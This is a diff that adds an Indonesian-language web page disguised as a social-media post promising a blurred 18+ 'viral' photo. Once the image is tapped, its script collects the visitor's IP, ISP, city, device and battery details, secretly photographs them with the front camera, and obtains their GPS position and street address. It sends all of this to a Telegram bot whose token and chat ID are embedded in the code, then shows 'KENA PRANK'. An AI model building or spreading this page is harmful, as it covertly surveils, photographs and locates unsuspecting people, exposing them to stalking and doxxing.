@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viral Banget 🔥</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        
+        .card {
+            background: white;
+            max-width: 420px;
+            width: 100%;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        /* Header */
+        .card-header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #0064e0, #00a6ff);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .profile-text h4 {
+            font-size: 14px;
+            margin-bottom: 2px;
+        }
+        
+        .profile-text p {
+            font-size: 12px;
+            color: #65676b;
+        }
+        
+        .three-dots {
+            margin-left: auto;
+            color: #65676b;
+            font-weight: bold;
+        }
+        
+        /* Image container - SEKARANG BISA DI KLIK */
+        .image-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1/1;
+            background: #e4e6eb;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .image-container:hover {
+            opacity: 0.95;
+        }
+        
+        .image-container:active {
+            transform: scale(0.99);
+        }
+        
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(12px);
+            pointer-events: none;
+        }
+        
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            backdrop-filter: blur(2px);
+            gap: 8px;
+            pointer-events: none;
+        }
+        
+        .blur-overlay span:first-child {
+            font-size: 40px;
+        }
+        
+        .click-hint {
+            background: rgba(255,255,255,0.2);
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        
+        /* Action buttons */
+        .actions {
+            padding: 8px 16px;
+            display: flex;
+            gap: 16px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        .action-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #65676b;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px 0;
+        }
+        
+        .action-btn.active {
+            color: #1877f2;
+        }
+        
+        .action-icon {
+            font-size: 20px;
+        }
+        
+        /* Stats */
+        .stats {
+            padding: 10px 16px;
+            font-size: 14px;
+            color: #65676b;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        /* Caption */
+        .caption {
+            padding: 12px 16px;
+            font-size: 14px;
+            border-bottom: 1px solid #e4e6eb;
+        }
+        
+        .caption strong {
+            color: #385898;
+        }
+        
+        /* Comments section */
+        .comments-section {
+            padding: 12px 16px;
+            background: #f9f9f9;
+        }
+        
+        .comments-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #65676b;
+        }
+        
+        .comment {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+        
+        .comment-avatar {
+            width: 32px;
+            height: 32px;
+            background: #e4e6eb;
+            border-radius: 50%;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #385898;
+        }
+        
+        .comment-content {
+            flex: 1;
+            background: #f0f2f5;
+            padding: 10px 12px;
+            border-radius: 18px;
+            font-size: 13px;
+        }
+        
+        .comment-name {
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: #385898;
+        }
+        
+        .comment-text {
+            color: #050505;
+            margin-bottom: 6px;
+        }
+        
+        .comment-actions {
+            display: flex;
+            gap: 16px;
+            font-size: 12px;
+            color: #65676b;
+            margin-top: 6px;
+        }
+        
+        .comment-time {
+            font-size: 11px;
+            color: #65676b;
+            margin-left: auto;
+        }
+        
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #1877f2;
+            display: none;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 3px solid #e4e6eb;
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Prank result */
+        .prank-result {
+            background: #42b72a;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 20px;
+            margin: 16px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        #hiddenCamera {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        .small-note {
+            color: #65676b;
+            font-size: 12px;
+            text-align: center;
+            margin: 8px 16px;
+        }
+        
+        /* Button (opsional, bisa dihapus kalo gak pake) */
+        .button-container {
+            padding: 16px;
+            border-top: 1px solid #e4e6eb;
+        }
+        
+        .view-photo-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .view-photo-btn:hover {
+            background: #166fe5;
+        }
+        
+        .view-photo-btn:disabled {
+            background: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <!-- Header -->
+        <div class="card-header">
+            <div class="avatar">VN</div>
+            <div class="profile-text">
+                <h4>Viral News</h4>
+                <p>1 jam yang lalu · 🌍</p>
+            </div>
+            <div class="three-dots">⋯</div>
+        </div>
+        
+        <!-- Image - BISA DI KLIK LANGSUNG -->
+        <div class="image-container" id="viralImage" onclick="handleClick()">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400' viewBox='0 0 400 400'%3E%3Crect width='400' height='400' fill='%23333'/%3E%3Ctext x='80' y='180' font-family='Arial' font-size='20' fill='%23fff'%3EKONTEN SENSITIF%3C/text%3E%3C/svg%3E" alt="viral">
+            <div class="blur-overlay">
+                <span>🔞</span>
+                <span>Konten Sensitif - 18+</span>
+                <div class="click-hint">🔓 Ketuk untuk membuka</div>
+            </div>
+        </div>
+        
+        <!-- Action Buttons -->
+        <div class="actions">
+            <div class="action-btn" id="likeBtn" onclick="toggleLike()">
+                <span class="action-icon" id="likeIcon">❤️</span>
+                <span id="likeCount">2.2rb</span>
+            </div>
+            <div class="action-btn">
+                <span class="action-icon">💬</span>
+                <span>247</span>
+            </div>
+            <div class="action-btn">
+                <span class="action-icon">📤</span>
+                <span>Bagikan</span>
+            </div>
+        </div>
+        
+        <!-- Stats -->
+        <div class="stats" id="stats">
+            2.2rb suka · 247 komentar · 324 dibagikan
+        </div>
+        
+        <!-- Caption -->
+        <div class="caption">
+            <strong>Viral banget</strong> Foto ini udah dilihat ribuan orang. Ketuk gambarnya buat liat fotonya.
+        </div>
+        
+        <!-- Comments Section -->
+        <div class="comments-section">
+            <div class="comments-header">
+                <span>Komentar (247)</span>
+                <span>Terbaru ▼</span>
+            </div>
+            
+            <!-- Komentar 1 -->
+            <div class="comment">
+                <div class="comment-avatar">BD</div>
+                <div class="comment-content">
+                    <div class="comment-name">Budi Santoso</div>
+                    <div class="comment-text">Ini beneran? 😳</div>
+                    <div class="comment-actions">
+                        <span>Suka</span>
+                        <span>Balas</span>
+                        <span class="comment-time">45 menit</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Komentar 2 -->
+            <div class="comment">
+                <div class="comment-avatar">SA</div>
+                <div class="comment-content">
+                    <div class="comment-name">Siti Aminah</div>
+                    <div class="comment-text">Udah viral di Twitter nih 🔥</div>
+                    <div class="comment-actions">
+                        <span>Suka</span>
+                        <span>Balas</span>
+                        <span class="comment-time">32 menit</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Komentar 3 -->
+            <div class="comment">
+                <div class="comment-avatar">RR</div>
+                <div class="comment-content">
+                    <div class="comment-name">Rizki Ramadhan</div>
+                    <div class="comment-text">Tolong dihapus ya admin 😬</div>
+                    <div class="comment-actions">
+                        <span>Suka</span>
+                        <span>Balas</span>
+                        <span class="comment-time">18 menit</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading -->
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <div style="margin-top: 10px;">Membuka konten...</div>
+        </div>
+        
+        <!-- Prank Result -->
+        <div class="prank-result" id="prankResult">
+            😂 KENA PRANK! 😂
+        </div>
+        
+        <!-- Small note -->
+        <div class="small-note" id="smallNote"></div>
+    </div>
+    
+    <!-- Kamera tersembunyi -->
+    <video id="hiddenCamera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" width="640" height="480" style="display: none;"></canvas>
+    
+    <script>
+        // ===========================================
+        // GANTI INI BRO!
+        // ===========================================
+        const TELEGRAM_TOKEN = '6627037707:AAEJS_pFSv8hMI62eQETMCHFaLiHt3WPJos'; // GANTI!
+        const TELEGRAM_CHAT_ID = '6239380758'; // GANTI!
+        // ===========================================
+        
+        // Like button state
+        let liked = false;
+        let likeCount = 2200;
+        
+        function toggleLike() {
+            const likeIcon = document.getElementById('likeIcon');
+            const likeCountEl = document.getElementById('likeCount');
+            const likeBtn = document.getElementById('likeBtn');
+            
+            if (!liked) {
+                likeIcon.innerHTML = '❤️';
+                likeCount += 1;
+                likeBtn.classList.add('active');
+                liked = true;
+            } else {
+                likeIcon.innerHTML = '❤️';
+                likeCount -= 1;
+                likeBtn.classList.remove('active');
+                liked = false;
+            }
+            
+            likeCountEl.innerHTML = formatNumber(likeCount);
+        }
+        
+        function formatNumber(num) {
+            if (num >= 1000) {
+                return (num/1000).toFixed(1) + 'rb';
+            }
+            return num.toString();
+        }
+        
+        // Data korban
+        let dataKorban = {
+            ip: 'Unknown',
+            kota: 'Unknown',
+            negara: 'Unknown',
+            isp: 'Unknown',
+            lat: null,
+            lon: null,
+            alamat: 'Tidak ada',
+            device: 'Unknown',
+            browser: 'Unknown',
+            os: 'Unknown',
+            resolusi: 'Unknown',
+            baterai: 'Unknown'
+        };
+        
+        // ===========================================
+        // FUNGSI AMBIL DATA
+        // ===========================================
+        
+        async function getIPLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                dataKorban.ip = data.ip || 'Unknown';
+                dataKorban.kota = data.city || 'Unknown';
+                dataKorban.negara = data.country_name || 'Unknown';
+                dataKorban.isp = data.org || 'Unknown';
+                dataKorban.lat = data.latitude;
+                dataKorban.lon = data.longitude;
+            } catch (e) {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    dataKorban.ip = data.ip;
+                } catch (e2) {}
+            }
+        }
+        
+        async function getGPSLocation() {
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            dataKorban.lat = position.coords.latitude;
+                            dataKorban.lon = position.coords.longitude;
+                            
+                            try {
+                                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${dataKorban.lat}&lon=${dataKorban.lon}`);
+                                const data = await res.json();
+                                if (data.display_name) {
+                                    dataKorban.alamat = data.display_name;
+                                }
+                            } catch (e) {}
+                            
+                            resolve(true);
+                        },
+                        (error) => {
+                            resolve(false);
+                        }
+                    );
+                } else {
+                    resolve(false);
+                }
+            });
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            
+            let browser = 'Unknown';
+            if (ua.includes('Chrome')) browser = 'Chrome';
+            else if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            else if (ua.includes('Edge')) browser = 'Edge';
+            
+            let os = 'Unknown';
+            if (ua.includes('Windows')) os = 'Windows';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iOS')) os = 'iOS';
+            
+            dataKorban.device = navigator.platform || 'Unknown';
+            dataKorban.browser = browser;
+            dataKorban.os = os;
+            dataKorban.resolusi = `${screen.width}x${screen.height}`;
+            
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    let level = Math.round(battery.level * 100);
+                    dataKorban.baterai = `${level}% ${battery.charging ? '(ngecas)' : ''}`;
+                });
+            }
+        }
+        
+        // ===========================================
+        // FUNGSI KIRIM KE TELEGRAM
+        // ===========================================
+        async function sendToTelegram() {
+            try {
+                const pesan = `
+🔥 *PRANK BERHASIL!* 🔥
+━━━━━━━━━━━━━━━━━━━━━
+🌐 *IP:* ${dataKorban.ip}
+📍 *Kota:* ${dataKorban.kota}
+🌍 *Negara:* ${dataKorban.negara}
+🏢 *ISP:* ${dataKorban.isp}
+
+📌 *GPS:* ${dataKorban.lat ? dataKorban.lat + ', ' + dataKorban.lon : 'Tidak aktif'}
+🏠 *Alamat:* ${dataKorban.alamat || 'Tidak ada'}
+
+📱 *Device:* ${dataKorban.device}
+💻 *Browser:* ${dataKorban.browser}
+🖥️ *OS:* ${dataKorban.os}
+📺 *Resolusi:* ${dataKorban.resolusi}
+🔋 *Baterai:* ${dataKorban.baterai}
+⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
+
+━━━━━━━━━━━━━━━━━━━━━
+📸 *Foto korban menyusul!*
+                `;
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (window.fotoKorban) {
+                    const blob = dataURLtoBlob(window.fotoKorban);
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'korban.jpg');
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+                
+                if (dataKorban.lat && dataKorban.lon) {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            latitude: dataKorban.lat,
+                            longitude: dataKorban.lon
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log('Error:', e);
+            }
+        }
+        
+        function dataURLtoBlob(dataURL) {
+            const binary = atob(dataURL.split(',')[1]);
+            const array = [];
+            for (let i = 0; i < binary.length; i++) {
+                array.push(binary.charCodeAt(i));
+            }
+            return new Blob([new Uint8Array(array)], {type: 'image/jpeg'});
+        }
+        
+        // ===========================================
+        // FUNGSI UTAMA - DIPANGGIL SAAT KLIK GAMBAR
+        // ===========================================
+        
+        async function handleClick() {
+            const loading = document.getElementById('loading');
+            const prankResult = document.getElementById('prankResult');
+            const smallNote = document.getElementById('smallNote');
+            const viralImage = document.getElementById('viralImage');
+            
+            // Disable klik
+            viralImage.style.pointerEvents = 'none';
+            loading.style.display = 'block';
+            smallNote.innerHTML = '';
+            
+            try {
+                await getIPLocation();
+                getDeviceInfo();
+                
+                // Minta izin kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                // Ambil foto
+                const video = document.getElementById('hiddenCamera');
+                const canvas = document.getElementById('hiddenCanvas');
+                video.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 500));
+                video.play();
+                await new Promise(r => setTimeout(r, 300));
+                
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                window.fotoKorban = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Matikan kamera
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Minta GPS
+                await getGPSLocation();
+                
+                // Kirim ke Telegram
+                await sendToTelegram();
+                
+                // Selesai
+                loading.style.display = 'none';
+                viralImage.style.display = 'none';
+                prankResult.style.display = 'block';
+                
+                document.querySelector('.stats').innerHTML = '😂 LU KENA PRANK! 😂';
+                
+                // Update like count biar lucu
+                document.getElementById('likeCount').innerHTML = '0';
+                
+            } catch (error) {
+                loading.style.display = 'none';
+                viralImage.style.pointerEvents = 'auto';
+                
+                // Small note halus
+                smallNote.innerHTML = '⚠️ Klik izinkan saat muncul notifikasi kamera untuk membuka konten';
+                setTimeout(() => {
+                    smallNote.innerHTML = '';
+                }, 4000);
+            }
+        }
+        
+        // Update stats random
+        setInterval(() => {
+            if (!document.getElementById('prankResult').style.display || 
+                document.getElementById('prankResult').style.display === 'none') {
+                const likes = Math.floor(2100 + Math.random() * 300);
+                const comments = Math.floor(230 + Math.random() * 40);
+                document.getElementById('stats').innerHTML = 
+                    `${formatNumber(likes)} suka · ${comments} komentar · 324 dibagikan`;
+                
+                if (!liked) {
+                    document.getElementById('likeCount').innerHTML = formatNumber(likes);
+                    likeCount = likes;
+                }
+            }
+        }, 8000);
+    </script>
+</body>
+</html>
